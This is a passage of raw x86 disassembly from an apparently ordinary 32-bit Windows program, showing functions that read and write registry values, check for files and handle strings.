  404ce1:	push   DWORD PTR [ecx+0x14]
  404ce4:	push   DWORD PTR [ecx+0x10]
  404ce7:	push   0x17
  404ce9:	pop    ecx
  404cea:	call   0x403900
  404cef:	mov    edi,DWORD PTR [ebp-0x28]
  404cf2:	lea    ecx,[esi-0x10]
  404cf5:	mov    BYTE PTR [ebp-0x4],0x1
  404cf9:	call   0x403776
  404cfe:	mov    BYTE PTR [ebp-0x4],0x0
  404d02:	test   edi,edi
  404d04:	je     0x404d11
  404d06:	push   edi
  404d07:	call   DWORD PTR ds:0x40a034
  404d0d:	and    DWORD PTR [ebp-0x28],0x0
  404d11:	or     DWORD PTR [ebp-0x4],0xffffffff
  404d15:	lea    ecx,[ebp-0x1c]
  404d18:	call   0x406edc
  404d1d:	mov    eax,ebx
  404d1f:	call   0x407e9b
  404d24:	ret    
  404d25:	int3   
  404d26:	int3   
  404d27:	int3   
  404d28:	int3   
  404d29:	int3   
  404d2a:	mov    edi,edi
  404d2c:	push   ebp
  404d2d:	mov    ebp,esp
  404d2f:	sub    esp,0x14
  404d32:	mov    eax,ds:0x409004
  404d37:	xor    eax,ebp
  404d39:	mov    DWORD PTR [ebp-0x4],eax
  404d3c:	push   ebx
  404d3d:	push   esi
  404d3e:	push   edi
  404d3f:	xor    ebx,ebx
  404d41:	mov    WORD PTR [ebp-0x8],0x500
  404d47:	lea    eax,[ebp-0x14]
  404d4a:	mov    DWORD PTR [ebp-0x10],ebx
  404d4d:	push   eax
  404d4e:	push   ebx
  404d4f:	push   ebx
  404d50:	push   ebx
  404d51:	push   ebx
  404d52:	push   ebx
  404d53:	push   ebx
  404d54:	push   ebx
  404d55:	push   0x4
  404d57:	xor    esi,esi
  404d59:	mov    DWORD PTR [ebp-0xc],ebx
  404d5c:	inc    esi
  404d5d:	lea    eax,[ebp-0xc]
  404d60:	push   esi
  404d61:	push   eax
  404d62:	mov    edi,ebx
  404d64:	call   DWORD PTR ds:0x40a018
  404d6a:	neg    eax
  404d6c:	sbb    eax,eax
  404d6e:	and    eax,DWORD PTR [ebp-0x14]
  404d71:	mov    DWORD PTR [ebp-0x14],eax
  404d74:	je     0x404d8d
  404d76:	lea    ecx,[ebp-0x10]
  404d79:	push   ecx
  404d7a:	push   eax
  404d7b:	push   ebx
  404d7c:	call   DWORD PTR ds:0x40a02c
  404d82:	push   DWORD PTR [ebp-0x14]
  404d85:	mov    edi,eax
  404d87:	call   DWORD PTR ds:0x40a020
  404d8d:	mov    ecx,DWORD PTR ds:0x40900c
  404d93:	cmp    ecx,0x40900c
  404d99:	je     0x404dbd
  404d9b:	test   BYTE PTR [ecx+0x1c],0x10
  404d9f:	je     0x404dbd
  404da1:	test   edi,edi
  404da3:	je     0x404dac
  404da5:	mov    eax,esi
  404da7:	cmp    DWORD PTR [ebp-0x10],ebx
  404daa:	jne    0x404dae
  404dac:	mov    eax,ebx
  404dae:	push   eax
  404daf:	push   DWORD PTR [ecx+0x14]
  404db2:	push   DWORD PTR [ecx+0x10]
  404db5:	push   0x18
  404db7:	pop    ecx
  404db8:	call   0x403855
  404dbd:	test   edi,edi
  404dbf:	je     0x404dc6
  404dc1:	cmp    DWORD PTR [ebp-0x10],ebx
  404dc4:	jne    0x404dc8
  404dc6:	mov    esi,ebx
  404dc8:	mov    ecx,DWORD PTR [ebp-0x4]
  404dcb:	mov    eax,esi
  404dcd:	pop    edi
  404dce:	pop    esi
  404dcf:	xor    ecx,ebp
  404dd1:	pop    ebx
  404dd2:	call   0x407750
  404dd7:	mov    esp,ebp
  404dd9:	pop    ebp
  404dda:	ret    
  404ddb:	int3   
  404ddc:	int3   
  404ddd:	int3   
  404dde:	int3   
  404ddf:	int3   
  404de0:	push   0x8
  404de2:	mov    eax,0x40839b
  404de7:	call   0x407edc
  404dec:	mov    ebx,DWORD PTR [ebp+0x8]
  404def:	xor    eax,eax
  404df1:	mov    WORD PTR [ebx],ax
  404df4:	lea    eax,[ebp-0x14]
  404df7:	push   eax
  404df8:	call   0x404b42
  404dfd:	lea    ecx,[ebp-0x10]
  404e00:	xor    edx,edx
  404e02:	push   ecx
  404e03:	push   0x2001f
  404e08:	push   edx
  404e09:	mov    DWORD PTR [ebp-0x4],edx
  404e0c:	push   DWORD PTR [eax]
  404e0e:	mov    DWORD PTR [ebp-0x10],edx
  404e11:	push   0x80000002
  404e16:	call   DWORD PTR ds:0x40a024
  404e1c:	mov    edi,DWORD PTR [ebp+0x10]
  404e1f:	mov    esi,eax
  404e21:	test   esi,esi
  404e23:	jne    0x404e3d
  404e25:	xor    esi,esi
  404e27:	cmp    DWORD PTR [edi],esi
  404e29:	je     0x404e38
  404e2b:	push   DWORD PTR [edi]
  404e2d:	call   DWORD PTR ds:0x40a034
  404e33:	and    DWORD PTR [edi],0x0
  404e36:	mov    esi,eax
  404e38:	mov    eax,DWORD PTR [ebp-0x10]
  404e3b:	mov    DWORD PTR [edi],eax
  404e3d:	or     DWORD PTR [ebp-0x4],0xffffffff
  404e41:	mov    ecx,DWORD PTR [ebp-0x14]
  404e44:	lea    ecx,[ecx-0x10]
  404e47:	call   0x403776
  404e4c:	test   esi,esi
  404e4e:	je     0x404e71
  404e50:	mov    eax,ds:0x40900c
  404e55:	cmp    eax,0x40900c
  404e5a:	je     0x404e71
  404e5c:	test   BYTE PTR [eax+0x1c],0x8
  404e60:	je     0x404e71
  404e62:	push   esi
  404e63:	push   DWORD PTR [eax+0x14]
  404e66:	push   DWORD PTR [eax+0x10]
  404e69:	push   0x19
  404e6b:	pop    ecx
  404e6c:	call   0x403855
  404e71:	lea    eax,[ebp-0x14]
  404e74:	mov    DWORD PTR [ebp-0x14],0x400
  404e7b:	push   eax
  404e7c:	push   ebx
  404e7d:	push   0x401744
  404e82:	mov    ecx,edi
  404e84:	call   0x4021a3
  404e89:	test   eax,eax
  404e8b:	je     0x404eb5
  404e8d:	mov    ecx,DWORD PTR ds:0x40900c
  404e93:	cmp    ecx,0x40900c
  404e99:	je     0x404eb0
  404e9b:	test   BYTE PTR [ecx+0x1c],0x8
  404e9f:	je     0x404eb0
  404ea1:	push   eax
  404ea2:	push   DWORD PTR [ecx+0x14]
  404ea5:	push   DWORD PTR [ecx+0x10]
  404ea8:	push   0x1a
  404eaa:	pop    ecx
  404eab:	call   0x403855
  404eb0:	xor    eax,eax
  404eb2:	mov    WORD PTR [ebx],ax
  404eb5:	call   0x407e9b
  404eba:	ret    0xc
  404ebd:	int3   
  404ebe:	int3   
  404ebf:	int3   
  404ec0:	int3   
  404ec1:	int3   
  404ec2:	mov    edi,edi
  404ec4:	push   ebp
  404ec5:	mov    ebp,esp
  404ec7:	push   ecx
  404ec8:	push   ebx
  404ec9:	push   esi
  404eca:	mov    ebx,ecx
  404ecc:	xor    eax,eax
  404ece:	and    DWORD PTR [ebp-0x4],eax
  404ed1:	push   edi
  404ed2:	mov    WORD PTR [ebx],ax
  404ed5:	lea    eax,[ebp-0x4]
  404ed8:	push   eax
  404ed9:	push   0x20019
  404ede:	push   0x0
  404ee0:	push   0x409090
  404ee5:	push   0x80000001
  404eea:	call   DWORD PTR ds:0x40a024
  404ef0:	mov    esi,eax
  404ef2:	test   esi,esi
  404ef4:	jne    0x404f5a
  404ef6:	mov    edi,DWORD PTR [ebp+0xc]
  404ef9:	cmp    DWORD PTR [edi],esi
  404efb:	je     0x404f0a
  404efd:	push   DWORD PTR [edi]
  404eff:	call   DWORD PTR ds:0x40a034
  404f05:	and    DWORD PTR [edi],0x0
  404f08:	mov    esi,eax
  404f0a:	mov    eax,DWORD PTR [ebp-0x4]
  404f0d:	mov    DWORD PTR [edi],eax
  404f0f:	test   esi,esi
  404f11:	jne    0x404f5a
  404f13:	mov    eax,DWORD PTR [ebp+0x8]
  404f16:	mov    ecx,edi
  404f18:	mov    DWORD PTR [ebp-0x4],eax
  404f1b:	lea    eax,[ebp-0x4]
  404f1e:	push   eax
  404f1f:	push   ebx
  404f20:	push   0x401744
  404f25:	call   0x4021a3
  404f2a:	test   eax,eax
  404f2c:	je     0x404f56
  404f2e:	mov    ecx,DWORD PTR ds:0x40900c
  404f34:	cmp    ecx,0x40900c
  404f3a:	je     0x404f51
  404f3c:	test   BYTE PTR [ecx+0x1c],0x8
  404f40:	je     0x404f51
  404f42:	push   eax
  404f43:	push   DWORD PTR [ecx+0x14]
  404f46:	push   DWORD PTR [ecx+0x10]
  404f49:	push   0x1c
  404f4b:	pop    ecx
  404f4c:	call   0x403855
  404f51:	xor    eax,eax
  404f53:	mov    WORD PTR [ebx],ax
  404f56:	xor    eax,eax
  404f58:	jmp    0x404f8a
  404f5a:	mov    eax,ds:0x40900c
  404f5f:	cmp    eax,0x40900c
  404f64:	je     0x404f7b
  404f66:	test   BYTE PTR [eax+0x1c],0x8
  404f6a:	je     0x404f7b
  404f6c:	push   esi
  404f6d:	push   DWORD PTR [eax+0x14]
  404f70:	push   DWORD PTR [eax+0x10]
  404f73:	push   0x1b
  404f75:	pop    ecx
  404f76:	call   0x403855
  404f7b:	test   esi,esi
  404f7d:	jle    0x404f88
  404f7f:	movzx  esi,si
  404f82:	or     esi,0x80070000
  404f88:	mov    eax,esi
  404f8a:	pop    edi
  404f8b:	pop    esi
  404f8c:	pop    ebx
  404f8d:	mov    esp,ebp
  404f8f:	pop    ebp
  404f90:	ret    0x8
  404f93:	int3   
  404f94:	int3   
  404f95:	int3   
  404f96:	int3   
  404f97:	int3   
  404f98:	push   0x98
  404f9d:	mov    eax,0x4083c6
  404fa2:	call   0x407edc
  404fa7:	mov    DWORD PTR [ebp-0x20],ecx
  404faa:	mov    ebx,DWORD PTR [ebp+0x8]
  404fad:	xor    eax,eax
  404faf:	xor    ecx,ecx
  404fb1:	xor    edi,edi
  404fb3:	mov    DWORD PTR [ebp-0x1c],edi
  404fb6:	mov    DWORD PTR [ebp-0x10],edi
  404fb9:	mov    WORD PTR [ebx],ax
  404fbc:	mov    eax,DWORD PTR [ebp+0x10]
  404fbf:	mov    WORD PTR [eax],cx
  404fc2:	lea    eax,[ebp-0x10]
  404fc5:	push   eax
  404fc6:	push   0x2001f
  404fcb:	push   edi
  404fcc:	push   0x4018f0
  404fd1:	push   0x80000001
  404fd6:	call   DWORD PTR ds:0x40a024
  404fdc:	test   eax,eax
  404fde:	jne    0x405144
  404fe4:	mov    esi,DWORD PTR [ebp+0x18]
  404fe7:	mov    eax,edi
  404fe9:	cmp    DWORD PTR [esi],eax
  404feb:	je     0x404ff7
  404fed:	push   DWORD PTR [esi]
  404fef:	call   DWORD PTR ds:0x40a034
  404ff5:	mov    DWORD PTR [esi],edi
  404ff7:	mov    ecx,DWORD PTR [ebp-0x10]
  404ffa:	mov    DWORD PTR [esi],ecx
  404ffc:	test   eax,eax
  404ffe:	jne    0x405144
  405004:	push   0x1
  405006:	lea    ecx,[ebp-0xa4]
  40500c:	call   0x40397d
  405011:	mov    DWORD PTR [ebp-0x38],edi
  405014:	mov    DWORD PTR [ebp-0x34],edi
  405017:	mov    DWORD PTR [ebp-0x30],edi
  40501a:	mov    DWORD PTR [ebp-0x2c],edi
  40501d:	mov    DWORD PTR [ebp-0x28],edi
  405020:	mov    DWORD PTR [ebp-0x24],0xa
  405027:	mov    DWORD PTR [ebp-0x4],edi
  40502a:	call   0x4061a9
  40502f:	mov    eax,DWORD PTR [eax]
  405031:	mov    DWORD PTR [ebp-0x10],eax
  405034:	test   eax,eax
  405036:	je     0x405135
  40503c:	lea    eax,[ebp-0x10]
  40503f:	push   eax
  405040:	call   0x405ac9
  405045:	mov    ecx,0x401598
  40504a:	mov    edi,DWORD PTR [eax]
  40504c:	mov    eax,DWORD PTR [edi+0x14]
  40504f:	mov    dx,WORD PTR [eax]
  405052:	cmp    dx,WORD PTR [ecx]
  405055:	jne    0x405075
  405057:	test   dx,dx
  40505a:	je     0x405071
  40505c:	mov    dx,WORD PTR [eax+0x2]
  405060:	cmp    dx,WORD PTR [ecx+0x2]
  405064:	jne    0x405075
  405066:	add    eax,0x4
  405069:	add    ecx,0x4
  40506c:	test   dx,dx
  40506f:	jne    0x40504f
  405071:	xor    eax,eax
  405073:	jmp    0x40507a
  405075:	sbb    eax,eax
  405077:	or     eax,0x1
  40507a:	test   eax,eax
  40507c:	setne  al
  40507f:	test   al,al
  405081:	je     0x40512b
  405087:	lea    eax,[ebp-0x18]
  40508a:	mov    ecx,esi
  40508c:	push   eax
  40508d:	push   DWORD PTR [edi]
  40508f:	call   0x402161
  405094:	test   eax,eax
  405096:	jne    0x40512b
  40509c:	mov    eax,DWORD PTR [ebp-0x18]
  40509f:	test   al,0x2
  4050a1:	je     0x40512b
  4050a7:	mov    ecx,DWORD PTR [ebp-0x20]
  4050aa:	and    eax,0xfffffffd
  4050ad:	push   0x4
  4050af:	mov    DWORD PTR [ebp-0x18],eax
  4050b2:	mov    DWORD PTR [ebp-0x14],eax
  4050b5:	lea    eax,[ebp-0x14]
  4050b8:	push   eax
  4050b9:	push   0x4
  4050bb:	xor    eax,eax
  4050bd:	mov    DWORD PTR [ecx+0x68],0x1
  4050c4:	push   eax
  4050c5:	push   DWORD PTR [edi]
  4050c7:	push   DWORD PTR [esi]
  4050c9:	call   DWORD PTR ds:0x40a10c
  4050cf:	test   BYTE PTR [ebp-0x18],0x1
  4050d3:	je     0x4050fc
  4050d5:	mov    ecx,ebx
  4050d7:	lea    edx,[ecx+0x2]
  4050da:	mov    ax,WORD PTR [ecx]
  4050dd:	add    ecx,0x2
  4050e0:	cmp    ax,WORD PTR [ebp-0x1c]
  4050e4:	jne    0x4050da
  4050e6:	sub    ecx,edx
  4050e8:	sar    ecx,1
  4050ea:	je     0x4050f8
  4050ec:	push   0x401618
  4050f1:	mov    ecx,ebx
  4050f3:	call   0x405cd5
  4050f8:	mov    ecx,ebx
  4050fa:	jmp    0x405124
  4050fc:	mov    ecx,DWORD PTR [ebp+0x10]
  4050ff:	lea    edx,[ecx+0x2]
  405102:	mov    ax,WORD PTR [ecx]
  405105:	add    ecx,0x2
  405108:	cmp    ax,WORD PTR [ebp-0x1c]
  40510c:	jne    0x405102
  40510e:	sub    ecx,edx
  405110:	sar    ecx,1
  405112:	je     0x405121
  405114:	mov    ecx,DWORD PTR [ebp+0x10]
  405117:	push   0x401618
  40511c:	call   0x405cd5
  405121:	mov    ecx,DWORD PTR [ebp+0x10]
  405124:	push   DWORD PTR [edi]
  405126:	call   0x405cd5
  40512b:	cmp    DWORD PTR [ebp-0x10],0x0
  40512f:	jne    0x40503c
  405135:	or     DWORD PTR [ebp-0x4],0xffffffff
  405139:	lea    ecx,[ebp-0xa4]
  40513f:	call   0x40616f
  405144:	call   0x407e9b
  405149:	ret    0x14
  40514c:	int3   
  40514d:	int3   
  40514e:	int3   
  40514f:	int3   
  405150:	int3   
  405151:	mov    edi,edi
  405153:	push   ebp
  405154:	mov    ebp,esp
  405156:	sub    esp,0x10
  405159:	push   edi
  40515a:	xor    edi,edi
  40515c:	push   edi
  40515d:	push   ecx
  40515e:	push   0x2001f
  405163:	push   0x1
  405165:	push   ecx
  405166:	push   0x4018f0
  40516b:	push   0x80000001
  405170:	lea    ecx,[ebp-0x10]
  405173:	mov    DWORD PTR [ebp-0x10],edi
  405176:	mov    DWORD PTR [ebp-0xc],edi
  405179:	mov    DWORD PTR [ebp-0x8],edi
  40517c:	call   0x405df9
  405181:	test   eax,eax
  405183:	jne    0x4051a3
  405185:	push   0x4
  405187:	lea    eax,[ebp-0x4]
  40518a:	mov    DWORD PTR [ebp-0x4],0x3
  405191:	push   eax
  405192:	mov    eax,DWORD PTR [ebp+0x8]
  405195:	push   0x4
  405197:	push   edi
  405198:	push   DWORD PTR [eax]
  40519a:	push   DWORD PTR [ebp-0x10]
  40519d:	call   DWORD PTR ds:0x40a10c
  4051a3:	cmp    DWORD PTR [ebp-0x10],0x0
  4051a7:	pop    edi
  4051a8:	je     0x4051b3
  4051aa:	push   DWORD PTR [ebp-0x10]
  4051ad:	call   DWORD PTR ds:0x40a034
  4051b3:	mov    esp,ebp
  4051b5:	pop    ebp
  4051b6:	ret    0x4
  4051b9:	int3   
  4051ba:	int3   
  4051bb:	int3   
  4051bc:	int3   
  4051bd:	int3   
  4051be:	push   0x228
  4051c3:	mov    eax,0x408415
  4051c8:	call   0x407f14
  4051cd:	mov    edi,DWORD PTR [ebp+0x8]
  4051d0:	mov    ebx,DWORD PTR [ebp+0x10]
  4051d3:	mov    eax,ds:0x40900c
  4051d8:	cmp    eax,0x40900c
  4051dd:	je     0x4051f9
  4051df:	test   BYTE PTR [eax+0x1c],0x8
  4051e3:	je     0x4051f9
  4051e5:	push   edi
  4051e6:	push   DWORD PTR [eax+0x14]
  4051e9:	mov    edx,0x4018b4
  4051ee:	push   DWORD PTR [eax+0x10]
  4051f1:	push   0x1f
  4051f3:	pop    ecx
  4051f4:	call   0x403882
  4051f9:	lea    eax,[ebp-0x21c]
  4051ff:	push   eax
  405200:	push   ecx
  405201:	push   0x3
  405203:	push   0x0
  405205:	push   ecx
  405206:	push   0x409090
  40520b:	push   0x80000001
  405210:	mov    ecx,ebx
  405212:	call   0x405df9
  405217:	mov    esi,eax
  405219:	test   esi,esi
  40521b:	je     0x405254
  40521d:	mov    eax,ds:0x40900c
  405222:	cmp    eax,0x40900c
  405227:	je     0x40523e
  405229:	test   BYTE PTR [eax+0x1c],0x8
  40522d:	je     0x40523e
  40522f:	push   esi
  405230:	push   DWORD PTR [eax+0x14]
  405233:	push   DWORD PTR [eax+0x10]
  405236:	push   0x20
  405238:	pop    ecx
  405239:	call   0x403855
  40523e:	test   esi,esi
  405240:	jle    0x4054e5
  405246:	movzx  esi,si
  405249:	or     esi,0x80070000
  40524f:	jmp    0x4054e5
  405254:	push   ecx
  405255:	push   edi
  405256:	push   ecx
  405257:	mov    ecx,ebx
  405259:	call   0x405e5e
  40525e:	mov    esi,eax
  405260:	test   esi,esi
  405262:	je     0x405281
  405264:	mov    eax,ds:0x40900c
  405269:	cmp    eax,0x40900c
  40526e:	je     0x40523e
  405270:	test   BYTE PTR [eax+0x1c],0x8
  405274:	je     0x40523e
  405276:	push   esi
  405277:	push   DWORD PTR [eax+0x14]
  40527a:	push   DWORD PTR [eax+0x10]
  40527d:	push   0x21
  40527f:	jmp    0x405238
  405281:	xor    ecx,ecx
  405283:	mov    ebx,ecx
  405285:	mov    DWORD PTR [ebp-0x234],ebx
  40528b:	mov    DWORD PTR [ebp-0x230],ecx
  405291:	mov    DWORD PTR [ebp-0x22c],ecx
  405297:	lea    eax,[ebp-0x21c]
  40529d:	mov    DWORD PTR [ebp-0x4],ecx
  4052a0:	push   eax
  4052a1:	push   0x20019
  4052a6:	push   ecx
  4052a7:	push   0x401760
  4052ac:	push   0x80000001
  4052b1:	mov    DWORD PTR [ebp-0x21c],ecx
  4052b7:	call   DWORD PTR ds:0x40a024
  4052bd:	mov    esi,eax
  4052bf:	test   esi,esi
  4052c1:	jne    0x4054a1
  4052c7:	mov    ebx,DWORD PTR [ebp-0x21c]
  4052cd:	push   0x206
  4052d2:	mov    DWORD PTR [ebp-0x234],ebx
  4052d8:	push   eax
  4052d9:	mov    WORD PTR [ebp-0x218],ax
  4052e0:	lea    eax,[ebp-0x216]
  4052e6:	push   eax
  4052e7:	call   0x407e84
  4052ec:	add    esp,0xc
  4052ef:	mov    DWORD PTR [ebp-0x21c],0x104
  4052f9:	lea    eax,[ebp-0x21c]
  4052ff:	lea    ecx,[ebp-0x234]
  405305:	push   eax
  405306:	lea    eax,[ebp-0x218]
  40530c:	push   eax
  40530d:	push   0x4017e4
  405312:	call   0x4021a3
  405317:	lea    eax,[ebp-0x218]
  40531d:	push   eax
  40531e:	lea    ecx,[ebp-0x220]
  405324:	call   0x4054f4
  405329:	lea    eax,[ebp-0x218]
  40532f:	mov    BYTE PTR [ebp-0x4],0x1
  405333:	push   eax
  405334:	lea    ecx,[ebp-0x228]
  40533a:	call   0x4054f4
  40533f:	lea    eax,[ebp-0x218]
  405345:	mov    BYTE PTR [ebp-0x4],0x2
  405349:	push   eax
  40534a:	lea    ecx,[ebp-0x224]
  405350:	call   0x4054f4
  405355:	push   0x4017f4
  40535a:	lea    ecx,[ebp-0x220]
  405360:	mov    BYTE PTR [ebp-0x4],0x3
  405364:	call   0x40349e
  405369:	push   0x401824
  40536e:	lea    ecx,[ebp-0x228]
  405374:	call   0x40349e
  405379:	push   0x401840
  40537e:	lea    ecx,[ebp-0x224]
  405384:	call   0x40349e
  405389:	push   DWORD PTR [ebp-0x220]
  40538f:	call   DWORD PTR ds:0x40a0b8
  405395:	cmp    eax,0xffffffff
  405398:	je     0x4053d6
  40539a:	push   0x401860
  40539f:	mov    ecx,edi
  4053a1:	call   0x405cd5
  4053a6:	push   DWORD PTR [ebp-0x220]
  4053ac:	call   DWORD PTR ds:0x40a0b4
  4053b2:	mov    eax,ds:0x40900c
  4053b7:	mov    esi,0x40900c
  4053bc:	cmp    eax,esi
  4053be:	je     0x4053db
  4053c0:	test   BYTE PTR [eax+0x1c],0x10
  4053c4:	je     0x4053db
  4053c6:	push   DWORD PTR [eax+0x14]
  4053c9:	push   DWORD PTR [eax+0x10]
  4053cc:	push   0x23
  4053ce:	pop    ecx
  4053cf:	call   0x40382e
  4053d4:	jmp    0x4053db
  4053d6:	mov    esi,0x40900c
  4053db:	push   DWORD PTR [ebp-0x228]
  4053e1:	call   DWORD PTR ds:0x40a0b8
  4053e7:	cmp    eax,0xffffffff
  4053ea:	je     0x405421
  4053ec:	push   0x401870
  4053f1:	mov    ecx,edi
  4053f3:	call   0x405cd5
  4053f8:	push   DWORD PTR [ebp-0x228]
  4053fe:	call   DWORD PTR ds:0x40a0b4
  405404:	mov    eax,ds:0x40900c
  405409:	cmp    eax,esi
  40540b:	je     0x405421
  40540d:	test   BYTE PTR [eax+0x1c],0x10
  405411:	je     0x405421
  405413:	push   DWORD PTR [eax+0x14]
  405416:	push   DWORD PTR [eax+0x10]
  405419:	push   0x24
  40541b:	pop    ecx
  40541c:	call   0x40382e
  405421:	push   DWORD PTR [ebp-0x224]
  405427:	call   DWORD PTR ds:0x40a0b8
  40542d:	cmp    eax,0xffffffff
  405430:	je     0x405467
  405432:	push   0x401890
  405437:	mov    ecx,edi
  405439:	call   0x405cd5
  40543e:	push   DWORD PTR [ebp-0x224]
  405444:	call   DWORD PTR ds:0x40a0b4
  40544a:	mov    eax,ds:0x40900c
  40544f:	cmp    eax,esi
  405451:	je     0x405467
  405453:	test   BYTE PTR [eax+0x1c],0x10
  405457:	je     0x405467
  405459:	push   DWORD PTR [eax+0x14]
  40545c:	push   DWORD PTR [eax+0x10]
  40545f:	push   0x25
  405461:	pop    ecx
  405462:	call   0x40382e
  405467:	mov    BYTE PTR [ebp-0x4],0x2
  40546b:	xor    esi,esi
  40546d:	mov    ecx,DWORD PTR [ebp-0x224]
  405473:	lea    ecx,[ecx-0x10]
  405476:	call   0x403776
  40547b:	mov    BYTE PTR [ebp-0x4],0x1
  40547f:	mov    ecx,DWORD PTR [ebp-0x228]
  405485:	lea    ecx,[ecx-0x10]
  405488:	call   0x403776
  40548d:	mov    BYTE PTR [ebp-0x4],0x0
  405491:	mov    ecx,DWORD PTR [ebp-0x220]
  405497:	lea    ecx,[ecx-0x10]
  40549a:	call   0x403776
  40549f:	jmp    0x4054cf
  4054a1:	mov    eax,ds:0x40900c
  4054a6:	cmp    eax,0x40900c
  4054ab:	je     0x4054c2
  4054ad:	test   BYTE PTR [eax+0x1c],0x8
  4054b1:	je     0x4054c2
  4054b3:	push   esi
  4054b4:	push   DWORD PTR [eax+0x14]
  4054b7:	push   DWORD PTR [eax+0x10]
  4054ba:	push   0x22
  4054bc:	pop    ecx
  4054bd:	call   0x403855
  4054c2:	test   esi,esi
  4054c4:	jle    0x4054cf
  4054c6:	movzx  esi,si
  4054c9:	or     esi,0x80070000
  4054cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4054d3:	test   ebx,ebx
  4054d5:	je     0x4054e5
  4054d7:	push   ebx
  4054d8:	call   DWORD PTR ds:0x40a034
  4054de:	and    DWORD PTR [ebp-0x234],0x0
  4054e5:	mov    eax,esi
  4054e7:	call   0x407eb4
  4054ec:	ret    0xc
  4054ef:	int3   
  4054f0:	int3   
  4054f1:	int3   
  4054f2:	int3   
  4054f3:	int3   
  4054f4:	push   0x8
  4054f6:	mov    eax,0x40844a
  4054fb:	call   0x407edc
  405500:	mov    esi,ecx
  405502:	mov    DWORD PTR [ebp-0x10],esi
  405505:	push   0x4093c0
  40550a:	call   0x403341
  40550f:	push   DWORD PTR [ebp+0x8]
  405512:	and    DWORD PTR [ebp-0x4],0x0
  405516:	mov    ecx,esi
  405518:	call   0x4057c9
  40551d:	test   al,al
  40551f:	jne    0x40552b
  405521:	push   DWORD PTR [ebp+0x8]
  405524:	mov    ecx,esi
  405526:	call   0x40322b
  40552b:	mov    eax,esi
  40552d:	call   0x407e9b
  405532:	ret    0x4
  405535:	int3   
  405536:	int3   
  405537:	int3   
  405538:	int3   
  405539:	int3   
  40553a:	mov    edi,edi
  40553c:	push   ebp
  40553d:	mov    ebp,esp
  40553f:	mov    eax,DWORD PTR [ebp+0x8]
  405542:	push   ebx
  405543:	mov    ebx,ecx
  405545:	push   edi
  405546:	mov    edx,DWORD PTR [eax]
  405548:	mov    edi,DWORD PTR [ebx]
  40554a:	sub    edi,0x10
  40554d:	lea    ecx,[edx-0x10]
  405550:	cmp    ecx,edi
  405552:	je     0x405582
  405554:	cmp    DWORD PTR [edi+0xc],0x0
  405558:	jl     0x405577
  40555a:	mov    eax,DWORD PTR [ecx]
  40555c:	cmp    eax,DWORD PTR [edi]
  40555e:	jne    0x405577
  405560:	push   esi
  405561:	call   0x405870
  405566:	mov    ecx,edi
  405568:	mov    esi,eax
  40556a:	call   0x403776
  40556f:	lea    eax,[esi+0x10]
  405572:	mov    DWORD PTR [ebx],eax
  405574:	pop    esi
  405575:	jmp    0x405582
  405577:	push   DWORD PTR [edx-0xc]
  40557a:	mov    ecx,ebx
  40557c:	push   edx
  40557d:	call   0x40356c
  405582:	pop    edi
  405583:	mov    eax,ebx
  405585:	pop    ebx
  405586:	pop    ebp
  405587:	ret    0x4
  40558a:	int3   
  40558b:	int3   
  40558c:	int3   
  40558d:	int3   
  40558e:	int3   
  40558f:	push   0x10
  405591:	mov    eax,0x408472
  405596:	call   0x407edc
  40559b:	mov    edi,ecx
  40559d:	mov    ebx,DWORD PTR [ebp+0x10]
  4055a0:	xor    ecx,ecx
  4055a2:	mov    DWORD PTR [ebp-0x1c],ecx
  4055a5:	mov    eax,DWORD PTR [ebx]
  4055a7:	test   eax,eax
  4055a9:	jns    0x4055b5
  4055ab:	mov    ecx,0x80070057
  4055b0:	call   0x403805
  4055b5:	mov    esi,DWORD PTR [ebp+0xc]
  4055b8:	test   esi,esi
  4055ba:	je     0x405612
  4055bc:	cmp    WORD PTR [esi],cx
  4055bf:	je     0x405612
  4055c1:	mov    ecx,DWORD PTR [edi]
  4055c3:	lea    edx,[ecx+eax*2]
  4055c6:	mov    eax,DWORD PTR [ecx-0xc]
  4055c9:	mov    DWORD PTR [ebp-0x10],edx
  4055cc:	lea    eax,[ecx+eax*2]
  4055cf:	mov    DWORD PTR [ebp-0x14],eax
  4055d2:	cmp    edx,eax
  4055d4:	jae    0x40564c
  4055d6:	push   esi
  4055d7:	push   edx
  4055d8:	call   DWORD PTR ds:0x40a194
  4055de:	pop    ecx
  4055df:	pop    ecx
  4055e0:	mov    ecx,DWORD PTR [ebp-0x10]
  4055e3:	mov    DWORD PTR [ebp-0x18],eax
  4055e6:	lea    eax,[ecx+eax*2]
  4055e9:	cmp    eax,DWORD PTR [ebp-0x14]
  4055ec:	jae    0x40564c
  4055ee:	push   esi
  4055ef:	push   eax
  4055f0:	call   DWORD PTR ds:0x40a198
  4055f6:	mov    edx,DWORD PTR [ebx]
  4055f8:	add    edx,DWORD PTR [ebp-0x18]
  4055fb:	pop    ecx
  4055fc:	pop    ecx
  4055fd:	push   eax
  4055fe:	lea    ecx,[edx+0x1]
  405601:	add    ecx,eax
  405603:	push   edx
  405604:	push   DWORD PTR [ebp+0x8]
  405607:	mov    DWORD PTR [ebx],ecx
  405609:	mov    ecx,edi
  40560b:	call   0x40573c
  405610:	jmp    0x40565f
  405612:	mov    esi,DWORD PTR [edi]
  405614:	cmp    eax,DWORD PTR [esi-0xc]
  405617:	jge    0x40564c
  405619:	mov    ecx,edi
  40561b:	call   0x4056dc
  405620:	mov    ecx,DWORD PTR [ebx]
  405622:	push   eax
  405623:	lea    edi,[esi+ecx*2]
  405626:	mov    esi,DWORD PTR [ebp+0x8]
  405629:	mov    ecx,esi
  40562b:	call   0x403341
  405630:	and    DWORD PTR [ebp-0x4],0x0
  405634:	mov    ecx,esi
  405636:	push   edi
  405637:	call   0x4057c9
  40563c:	test   al,al
  40563e:	jne    0x405648
  405640:	push   edi
  405641:	mov    ecx,esi
  405643:	call   0x40322b
  405648:	mov    eax,esi
  40564a:	jmp    0x405662
  40564c:	or     DWORD PTR [ebx],0xffffffff
  40564f:	mov    ecx,edi
  405651:	call   0x4056dc
  405656:	mov    ecx,DWORD PTR [ebp+0x8]
  405659:	push   eax
  40565a:	call   0x403341
  40565f:	mov    eax,DWORD PTR [ebp+0x8]
  405662:	call   0x407e9b
  405667:	ret    0xc
  40566a:	int3   
  40566b:	int3   
  40566c:	int3   
  40566d:	int3   
  40566e:	int3   
  40566f:	push   0x4
  405671:	mov    eax,0x4084a2
  405676:	call   0x407edc
  40567b:	mov    edi,ecx
  40567d:	mov    esi,0x4015b4
  405682:	call   0x4056dc
  405687:	push   eax
  405688:	lea    ecx,[ebp-0x10]
  40568b:	call   0x403341
